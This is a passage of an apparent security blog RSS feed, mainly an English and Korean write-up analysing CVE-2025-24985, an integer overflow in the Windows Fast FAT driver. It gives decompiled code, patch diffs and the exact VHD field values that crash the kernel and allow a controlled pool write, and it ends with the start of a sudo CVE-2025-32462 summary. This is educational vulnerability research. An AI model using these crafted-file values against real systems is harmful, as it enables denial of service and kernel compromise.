referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><p>&#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xC218;&#xAC00; 0xfffffffb&#xC778; vhd &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xACBD;&#xC6B0;, while &#xBB38;&#xC5D0;&#xC11C; Kernel pool overflow&#xB85C; &#xC778;&#xD574; Access Violation&#xC774; &#xBC1C;&#xC0DD;&#xD574; BSOD&#xAC00; &#xD130;&#xC9C0;&#xB294; &#xAC78; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <del>(&#xC601;&#xC0C1; &#xD3B8;&#xC9D1;&#xD558;&#xB290;&#xB77C; &#xD798;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;..)</del></p><p>&#xC55E;&#xC11C; &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xC758; &#xC0C1;&#xD0DC; &#xBCC0;&#xD654;(free -&gt; used, used -&gt;free)&#xB97C; &#xBE44;&#xD2B8;&#xB9F5;&#xC5D0; &#xAE30;&#xB85D;&#xD55C;&#xB2E4;&#xACE0; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xB2E4;&#xBA74;! &#xC720;&#xC800;&#xAC00; &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xC758; &#xC0C1;&#xD0DC;&#xB3C4; &#xCEE8;&#xD2B8;&#xB864;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBE44;&#xD2B8;&#xB9F5;&#xC5D0; &#xC784;&#xC758;&#xC758; &#xB370;&#xC774;&#xD130; write&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/16.png" alt></p><p>&#xBE44;&#xD2B8;&#xB9F5; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAE30;&#xB85D;&#xD558;&#xB294; while &#xBB38;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC704;&#xD574; <code>ExAllocatePoolWithTag()</code> &#xD568;&#xC218;&#xBD80;&#xD130; &#xB2E4;&#xC2DC; &#xC2DC;&#xC791;&#xD55C; &#xBAA8;&#xC2B5;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/17.png" alt></p><p>Size &#xAC12; overflow&#xB85C; &#xC778;&#xD574; 0x20&#xB9CC;&#xD07C; ffff990e`b8a58c50 &#xC8FC;&#xC18C;&#xC5D0; &#xD560;&#xB2F9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/18.png" alt></p><p>&#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC740; while &#xBB38; &#xB0B4;&#xC5D0;&#xC11C; vhd &#xD30C;&#xC77C;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xC758; offset&#xC744; &#xACC4;&#xC0B0;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC785;&#xB2C8;&#xB2E4;.</p><p>while &#xBB38;&#xC5D0;&#xC11C;&#xB294; 2&#xBC88; &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xC758; &#xC0C1;&#xD0DC; &#xC815;&#xBCF4;&#xBD80;&#xD130; &#xD655;&#xC778;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, 2&#xBC88; &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xC5D4;&#xD2B8;&#xB9AC;&#xC758; FAT Offset (FAT32 &#xAE30;&#xC900;)&#xC740; &#xC544;&#xB798; &#xC5F0;&#xC0B0;&#xC744; &#xD1B5;&#xD574; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>FAT Entry Offset = BytesPerSector x ReservedSectors + (&#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xBC88;&#xD638; &#xD7; 4)</li><li>FAT Entry Offset = 0x200 X 0x4 + ( 0x2 X 0x4 ) = 0x808</li></ul><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/19.png" alt></p><p>Partition Start Offset(0x10000)&#xC5D0; FAT Entry Offset&#xC744; &#xB354;&#xD558;&#xBA74;, vhd &#xD30C;&#xC77C; 0x10808 offset&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. 0x10808 offset&#xC740; while &#xBB38;&#xC5D0;&#xC11C; &#xCCAB; &#xBC88;&#xC9F8;&#xB85C; &#xC0C1;&#xD0DC; &#xC815;&#xBCF4;&#xB97C; &#xD655;&#xC778;&#xD558;&#xB294; 2&#xBC88; &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xC758; offset&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC55E;&#xC11C; <code>ExAllocatePoolWithTag()</code> &#xD568;&#xC218;&#xB85C; &#xD560;&#xB2F9;&#xB41C; &#xBE44;&#xD2B8;&#xB9F5; &#xC601;&#xC5ED;(ffff990e`b8a58c50)&#xC740; 1 bit&#xAC00; 1 &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xC758; &#xC0C1;&#xD0DC;&#xB97C; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;. vhd &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xC758; 4&#xBC14;&#xC774;&#xD2B8; &#xAC12;&#xC774; 0x00000000&#xC774;&#xBA74; free&#xB85C; &#xAC04;&#xC8FC;&#xD558;&#xC5EC; &#xBE44;&#xD2B8;&#xB9F5;&#xC758; &#xD574;&#xB2F9; bit&#xB97C; 0x0&#xC73C;&#xB85C;, 0x11111111&#xC774;&#xBA74; used&#xB85C; &#xAC04;&#xC8FC;&#xD558;&#xC5EC; 0x1&#xB85C; write &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C;, while &#xBB38;&#xC5D0;&#xC11C; 8&#xAC1C;&#xC758; &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xAC12;&#xC744; &#xCC98;&#xB9AC;&#xD588;&#xC744; &#xB54C;, &#xBE44;&#xD2B8;&#xB9F5;&#xC774; 0x41 &#xAC12;&#xC744; &#xAC00;&#xC9C0;&#xB3C4;&#xB85D; &#xC704; &#xADF8;&#xB9BC;&#xACFC; &#xAC19;&#xC774; 2&#xBC88; &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xC0C1;&#xD0DC; &#xAC12;&#xBD80;&#xD130; &#xCC28;&#xB840;&#xB300;&#xB85C; &#xC218;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/20.png" alt></p><p>&#xC218;&#xC815;&#xB41C; vhd &#xD30C;&#xC77C;&#xC744; &#xD1B5;&#xD574; while &#xBB38;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>&#xD604;&#xC7AC; &#xCC98;&#xB9AC;&#xB418;&#xB294; &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xC0C1;&#xD0DC; used, &#xC774;&#xC804; &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xC0C1;&#xD0DC; free<ul><li>&#xC774;&#xC804;&#xC5D0; free&#xB41C; &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xAC1C;&#xC218;&#xB9CC;&#xD07C; bit&#xB97C; 0x0&#xC73C;&#xB85C; &#xAE30;&#xB85D;</li></ul></li><li>&#xD604;&#xC7AC; &#xCC98;&#xB9AC;&#xB418;&#xB294; &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xC0C1;&#xD0DC; free, &#xC774;&#xC804; &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xC0C1;&#xD0DC; used<ul><li>&#xC774;&#xC804;&#xC5D0; used&#xB41C; &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xAC1C;&#xC218;&#xB9CC;&#xD07C; bit&#xB97C; 0x1&#xC73C;&#xB85C; &#xAE30;&#xB85D;</li></ul></li></ul><p>&#xB530;&#xB77C;&#xC11C;, &#xC218;&#xC815;&#xB41C; vhd &#xD30C;&#xC77C;&#xC740; 0100 0001&#xC774;&#xBBC0;&#xB85C; 0x41&#xC774; write &#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Kernel pool &#xC601;&#xC5ED;&#xC5D0; &#xC784;&#xC758;&#xC758; &#xB370;&#xC774;&#xD130; write &#xC99D;&#xBA85;&#xC774; &#xB418;&#xC5C8;&#xC73C;&#xB2C8;.. &#xC774;&#xC81C; paged pool&#xC5D0; &#xD560;&#xB2F9;&#xB418;&#xB294; Kernel &#xAD6C;&#xC870;&#xCCB4;&#xB97C; spray &#xD574;&#xC11C; &#xC774;&#xB7EC;&#xCFF5; &#xC800;&#xB7EC;&#xCFF5;&#xD558;&#xBA74; RCE&#xB97C; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;! <del>(&#xC544;&#xBAB0;&#xB791; &#xB3C4;&#xB9DD;&#xAC00;~)</del></p><h2 id="&#xB9C8;&#xBB34;&#xB9AC;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;"></a>&#xB9C8;&#xBB34;&#xB9AC;</h2><p>&#xC774;&#xBC88; &#xC5F0;&#xAD6C;&#xAE00;&#xC744; &#xC791;&#xC131;&#xD558;&#xBA74;&#xC11C; &#xCEE4;&#xB110; &#xB4DC;&#xB77C;&#xC774;&#xBE0C; &#xBD84;&#xC11D;, &#xB378;&#xD0C0; &#xD328;&#xCE58; &#xB4F1;&#xB4F1; &#xB9CE;&#xC740; &#xAC83;&#xC744; &#xBC30;&#xC6B8; &#xC218; &#xC788;&#xC5C8;&#xACE0; &#xD2B9;&#xD788; &#xD480;&#xC775;&#xC2A4;&#xB97C; &#xD574;&#xBCF4;&#xB824;&#xACE0; kernel paged pool &#xACF5;&#xBD80;&#xB97C; &#xD55C; &#xAC8C; &#xAC00;&#xC7A5; &#xAE30;&#xC5B5;&#xC5D0; &#xB0A8;&#xB294; &#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E;</p><p>&#xB9CC;&#xC57D;&#x2026; &#xD480;&#xC775;&#xC2A4;&#xC5D0; &#xC131;&#xACF5;&#xD55C;&#xB2E4;&#xBA74; &#xB2E4;&#xC74C; &#xC5F0;&#xAD6C;&#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xAE34; &#xAE00; &#xC77D;&#xC5B4;&#xC8FC;&#xC154;&#xC11C; &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;!</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/21.png" alt></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/Integer-Overflow/">Integer Overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows-Fast-FAT/">Windows Fast FAT</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-24985/">CVE-2025-24985</category>
      
      <category domain="https://hackyboiz.github.io/tags/BSOD/">BSOD</category>
      
      
      <comments>https://hackyboiz.github.io/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] CVE-2025-24985: Windows Fast FAT Driver RCE Vulnerability (EN)</title>
      <link>https://hackyboiz.github.io/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/</link>
      <guid>https://hackyboiz.github.io/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/</guid>
      <pubDate>Thu, 17 Jul 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2025/07/17/ogu123/[</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/1.png" alt></p><p>Hello, this is ogu123!</p><p>I&#x2019;ve been studying 1-day vulnerabilities through the publicly available resources, and I wanted to write my first vulnerability analysis post, so I prepared this one <del>(I don&#x2019;t know if I&#x2019;ll do it in the future, lol)</del></p><p>I tried to write the analysis process in detail, and there is also a BSOD PoC, so I recommend you to practice it!</p><p>So let&#x2019;s get started!</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/2.png" alt></p><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24985">https://nvd.nist.gov/vuln/detail/CVE-2025-24985</a></li></ul><p>Once we look at the vulnerability in NVD, we can see that it&#x2019;s an RCE vulnerability due to an Integer overflow in the Windows Fast FAT file system driver.</p><p>Now that we have a hint that it&#x2019;s an Integer overflow, let&#x2019;s start diffing!</p><h2 id="Analytics-environment"><a href="#Analytics-environment" class="headerlink" title="Analytics environment"></a>Analytics environment</h2><ul><li>Windows 10 version 22H2 19045.5854 for x64-based Systems education<ul><li>Version before the vulnerability was patched: fastfat.sys 10.0.19041.5438 (KB5051974)</li><li>Version after vulnerability patch: fastfat.sys 10.0.19041.5607 (KB5053606)</li></ul></li></ul><h2 id="Patch-Analysis-Before-vs-After"><a href="#Patch-Analysis-Before-vs-After" class="headerlink" title="Patch Analysis - Before vs After"></a>Patch Analysis - Before vs After</h2><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/3.png" alt></p><p>Looking at the bindiff results, we can see that the <code>FatSetupAllocationSupport()</code> and <code>FatExamineFatEntries()</code> functions have changed after the patch. <del>(That&#x2019;s only two changes ^^)</del></p><p>Let&#x2019;s compare the pre- and post-patch binaries to see what code changes were made to each function!</p><h3 id="FatSetupAllocationSupport"><a href="#FatSetupAllocationSupport" class="headerlink" title="FatSetupAllocationSupport()"></a>FatSetupAllocationSupport()</h3><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/4.png" alt></p><p>Above is the patched <code>FatSetupAllocationSupport()</code> function, which has been changed to the following.</p><ul><li>Added code to validate for overflow before performing the operation in the red else statement.</li></ul><h3 id="FatExamineFatEntries"><a href="#FatExamineFatEntries" class="headerlink" title="FatExamineFatEntries()"></a>FatExamineFatEntries()</h3><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/5.png" alt></p><p>The above is the patched <code>FatExamineFatEntries()</code> function, which has been changed to the following.</p><ul><li>If the if statement is true, the value *(a2 + 0x15C) is used as the value of the v47 variable and code has been added to validate<br>overflow on the v47 variable value.</li><li>If the value of V47 + 7 does not overflow, it is then used as the value for the <code>ExAllocatePoolWithTag()</code> function Size.</li></ul><p>The function call flow is <code>FatSetupAllocationSupport()</code> &#x2192; <code>FatExamineFatEntries()</code>, so we&#x2019;ll analyze the pre-patch binary <code>FatSetupAllocationSupport()</code> function from the top-down, but we&#x2019;ll focus on the following points in each function!</p><ul><li><code>FatSetupAllocationSupport()</code><ul><li>Values used in operations</li></ul></li><li><code>FatExamineFatEntries()</code><ul><li>Conditions in an if statement</li><li>Value *(a2 + 0x15C)</li></ul></li></ul><h2 id="Vulnerability-analysis"><a href="#Vulnerability-analysis" class="headerlink" title="Vulnerability analysis"></a>Vulnerability analysis</h2><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/6.png" alt></p><p>First, to analyze the <code>FatSetupAllocationSupport()</code> function, we created a random vhd file as shown below!</p><ul><li>File Name: ogu123.vhd</li><li>Disk size: 1 GB</li><li>Disk format: VHD</li><li>Disk type: Fixed size</li><li>Partition format: MBR</li><li>Partition System: FAT32</li></ul><p>Before analyzing, you can refer to the following article to learn how to set up kernel debugging! (shout out L0ch!)</p><ul><li><a href="https://hackyboiz.github.io/2021/05/30/l0ch/windows-driver/">https://hackyboiz.github.io/2021/05/30/l0ch/windows-driver/</a></li></ul><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/7.png" alt></p><p>After setting up Kernel debugging, we can set a break point in the <code>FatSetupAllocationSupport()</code> function and mount the ogu123.vhd file we created earlier, and we can start analyzing!</p><p>After analyzing, we see the value inside the else statement as shown above.</p><p>In the previously patched binary, code was added to check for overflows before computing, so we checked the vhd file thinking that it was a value that the user could control.</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/8.png" alt></p><p>I checked the vhd file and found that the else statement is using a value that exists within drive - boot_sector!</p><p>The tip here is to set it to Drive and not VHD in 010 editor Templates so you can see the picture above.</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/9.png" alt></p><p>Match the values in the vhd file to the variables to see what it looks like. <del>(It&#x2019;s colorful)</del></p><ul><li>V15 = (NumberOfSector32 - NumberOfFatTables * SectorsPerFat32 - ReservedSectors) /<br>SectorsPerCluster</li></ul><p>If you look at the operation, you can see that it&#x2019;s counting the number of clusters on a FAT file system!</p><p>To summarize so far, after the patch, we saw that in the <code>FatSetupAllocationSupport()</code> function, code was added to validate the value used in the cluster count computation for overflow, and although not shown in the figure, it stores the number of clusters in <strong>*(a2 + 0x15C)</strong>.</p><p>Later, in the <code>FatExamineFatEntries()</code> function, in order to use <strong>the number of clusters (*(a2 + 0x15C))</strong> as the size value in the <code>ExAllocatePoolWithTag()</code> function, we first need to make sure that the if (<em>(a2 + 0xC8) &lt;= 1u) statement is true, so let&#x2019;s trace the value </em>(a2 + 0xC8)!</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/10.png" alt></p><p>After analyzing, we found that the if (*(a2 + 0xC8) &lt;= 1u) inside the <code>FatExamineFatEntries()</code> function is checked first in the <code>FatSetupAllocationSupport()</code> function.</p><p>In order for the if ((a2 + 0xC8) &lt;= 1u) statement to be true, we need to use the v35 variable in the if((a2 + 0x168) &#x2026; v34 &gt;<br>0x10000) statement or go into the else statement.</p><p>In this case, the value of (a2 + 0x168) must be 0x20 to enter the cluster computation process and since the v34 variable is the number of clusters ((a2 + 0x15c)), we controlled the value of *(a2 + 0xC8) with the v35 variable.</p><p>Once I modified the <strong>cluster count to a value of 0xFFFFFFFB</strong>, I went through the process below to make it true in the if (*(a2 + 0xC8) &lt;= 1u) statement.</p><ul><li>v35 = (0xFFFFFFFB + 0xFFFF) = 0xFFFA</li><li>(*(a2 + 0xC8) = 0xFFFA &gt;&gt; 0x10 = 0</li></ul><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/11.png" alt></p><p>After modifying the vhd file as above, the cluster count will have a value of 0xFFFFFFFB after the following operation.</p><ul><li>V15 = (NumberOfSector32 - NumberOfFatTables * SectorsPerFat32 - ReservedSectors) /<br>SectorsPerCluster</li><li><strong>0xFFFFFFFB</strong> = ( 0xFFFFFFFF - 0x2 * 0x80000000 - 0x4 ) / 0x1</li></ul><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/12.png" alt></p><p>When you run the modified vhd file, you can see that the overflow within if(<em>(a2 + 0x168) &#x2026; v34 &gt; 0x10000) causes the value of </em>(a2 + 0xC8) to be zero, making the if statement true and using the NumberOfClusters (0xfffffffb) as the value of the NumberOfClusters variable.</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/13.png" alt></p><p>Then, while computing the value of Size in the <code>ExAllocatePoolWithTag()</code> function, (NumberOfClusters +7), an overflow occurs, resulting in the value of rdx to be 0x2, and the value of Size finally becomes 0x0 when computing &gt;&gt; 3.</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/14.png" alt></p><p>This shows the block information of the memory pool page after running the <code>ExAllocatePoolWithTag()</code> function.</p><p>You can see that even if the Size value of the <code>ExAllocatePoolWithTag()</code> function is 0x0, a Size of 0x20 is allocated to the paged pool.</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/15.png" alt></p><p>The allocated region is then initialized as a bitmap with the <code>RtlInitializeBitMap()</code> function.</p><p>You can see that the <code>ExAllocatePoolWithTag()</code> and <code>RtlInitializeBitMap()</code> functions map one bit per cluster.</p><pre><code class="hljs cpp"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){   [...]       <span class="hljs-keyword">if</span> ( !v29 &amp;&amp; v32 )                          <span class="hljs-comment">// free -&gt; used </span>    {       v38 = v7 - v30;       <span class="hljs-keyword">if</span> ( v14 )       {         *v14 += v38;         v10[<span class="hljs-number">2</span>] += v38;         v17 = v45;       }       <span class="hljs-keyword">if</span> ( p_BitMapHeader )       {         RtlClearBits(p_BitMapHeader, v30 - v69, v38);         v17 = v45;         v32 = v68;         v28 = <span class="hljs-number">0</span>;       }       v29 = <span class="hljs-number">1</span>;       v48 = <span class="hljs-number">1</span>;       v30 = v7;       v51 = v7;     }     <span class="hljs-keyword">if</span> ( v29 == <span class="hljs-number">1</span> &amp;&amp; !v32 )                     <span class="hljs-comment">// used -&gt; free </span>    {       <span class="hljs-keyword">if</span> ( p_BitMapHeader )       {         RtlSetBits(p_BitMapHeader, v30 - v69, v7 - v30);         v17 = v45;         v28 = <span class="hljs-number">0</span>;       }       v29 = v28;       v48 = v28;       v30 = v7;       v51 = v7;     }   [...]   }</code></pre><p>After the bitmap initialization, the while statement above detects the change of state of the cluster (free -&gt; used, used -&gt;free) within the vhd file and writes it to the bitmap.</p><p>We modify the bitmap using the <code>RtlClearBits()</code> and <code>RtlSetBits()</code> functions, and we can see that this manages the cluster allocation status.</p><p>The while statement runs as many times as the number of clusters (0xfffffffb) to write the bitmap data, Since the bitmap size allocated via the <code>ExAllocatePoolWithTag()</code> function is 0x20, the allocated pool area exceeds, causing a kernel pool overflow.</p><h2 id="BSOD-Triggers"><a href="#BSOD-Triggers" class="headerlink" title="BSOD Triggers"></a>BSOD Triggers</h2><iframe width="560" height="315" src="https://www.youtube.com/embed/6ppD0oRZhXU?si=NEvYSd5jf0NMaObw" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><p>If you run the vhd file with the cluster count 0xfffffffb, you can see that the while statement causes an Access Violation due to a kernel pool overflow, resulting in a BSOD. <del>(I had a hard time editing the video&#x2026;^^)</del></p><p>Earlier, we said that the cluster&#x2019;s state change (free -&gt; used, used -&gt;free) is recorded in the bitmap. Yes! Since the user can also control the cluster&#x2019;s state, it is possible to write arbitrary data to the bitmap.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/16.png" alt></p><p>Here we are starting over with the <code>ExAllocatePoolWithTag()</code> function to analyze the while statement that records the bitmap data.</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/17.png" alt></p><p>Size value overflowed and was allocated to address ffff990e`b8a58c50 by 0x20.</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/18.png" alt></p><p>This part is the process of calculating the offset of the clusters present in the VHD file within the while statement.</p><p>Since the while statement checks the status information of cluster 2 first, the FAT offset (in FAT32) of the cluster 2 entry can be obtained by the following operation.</p><ul><li>FAT Entry Offset = BytesPerSector x ReservedSectors + (cluster number &#xD7; 4)</li><li>FAT Entry Offset = 0x200 X 0x4 + ( 0x2 X 0x4 ) = 0x808</li></ul><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/19.png" alt></p><p>If we add the FAT Entry Offset to the Partition Start Offset (0x10000), we get the vhd file 0x10808 offset.<br>The 0x10808 offset will be the offset of cluster number 2, which is the first cluster we check for status information in the while statement.</p><p>The bitmap area (ffff990eb8a58c50) allocated earlier with the <code>ExAllocatePoolWithTag()</code> function, where 1 bit indicates the status of cluster 1.<br>If the 4-byte value of the cluster in the vhd file is 0x00000000, we consider it free and write the corresponding bit in the bitmap to 0x0, and if it is 0x11111111, we consider it used and write it to 0x1.</p><p>So, when we processed 8 cluster values in the while statement, we modified the bitmap to have a value of 0x41, starting with cluster state value 2, as shown above.</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/20.png" alt></p><p>With the modified vhd file, the while statement works like this</p><ul><li>Currently processed cluster state used, previous cluster state free<ul><li>Write bits to 0x0 for the number of previously free clusters</li></ul></li><li>Currently processed cluster state FREE, previous cluster state USED<ul><li>Write bit as 0x1 for the number of clusters previously used</li></ul></li></ul><p>So, since the modified vhd file is 0100 0001, we can see that 0x41 is written.</p><p>Now that we have proof of writing arbitrary data to the kernel pool area,&#x2026;we can spray the kernel structures that are allocated in the paged pool and blah blah blah and trigger an RCE!</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>I learned a lot about kernel drive analysis, delta patching, etc. while writing this research article, and I think the most memorable part was studying kernel paged pool to try full exploit!</p><p>If&#x2026; I succeed in full exploit, I&#x2019;ll be back with the next article!</p><p>Thank you for reading this long post!</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/21.png" alt></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/Integer-Overflow/">Integer Overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows-Fast-FAT/">Windows Fast FAT</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-24985/">CVE-2025-24985</category>
      
      <category domain="https://hackyboiz.github.io/tags/BSOD/">BSOD</category>
      
      
      <comments>https://hackyboiz.github.io/2025/07/17/ogu123/[Research]_CVE-2025-24985/EN/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-32462: sudo에서 -h 옵션을 이용한 권한 상승(EoP) 취약점</title>
      <link>https://hackyboiz.github.io/2025/07/16/poosic/cve-2025-32462/</link>
      <guid>https://hackyboiz.github.io/2025/07/16/poosic/cve-2025-32462/</guid>
      <pubDate>Wed, 16 Jul 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.stratascale.com/vulnerability-alert-CVE</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://www.stratascale.com/vulnerability-alert-CVE-2025-32462-sudo-host">https://www.stratascale.com/vulnerability-alert-CVE-2025-32462-sudo-host</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>sudo Stable: v1.9.0 ~ v1.9.17</li><li>sudo Legacy: v1.8.8 ~ v1.8.32</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-32462&#xB294; sudo&#xC758; <code>--host</code> &#xC635;&#xC158;&#xC744; &#xC774;&#xC6A9;&#xD55C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;(EoP, Elevation of Privilege) &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. sudo&#xC5D0;&#xC11C; <code>--host</code>&#xC635;&#xC158;&#xC774; &#xCD94;&#xAC00;&#xB41C;&#xC9C0; 12&#xB144;&#xB9CC;&#xC5D0; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xBCC4;&#xB3C4;&#xC758; exploit&#xC774; &#xD544;&#xC694;&#xD558;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC; <code>Host_Alias</code>&#xB098; <code>Host</code> &#xC9C0;&#xC2DC;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xD638;&#xC2A4;&#xD2B8;&#xBCC4; &#xAD8C;&#xD55C;&#xC744; &#xBD84;&#xB9AC;&#xD574; &#xAD6C;&#xC131;&#xB418;&#xB294; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC545;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>--host</code> &#xC635;&#xC158;&#xC740; &#xC9C0;&#xC815;&#xD55C; 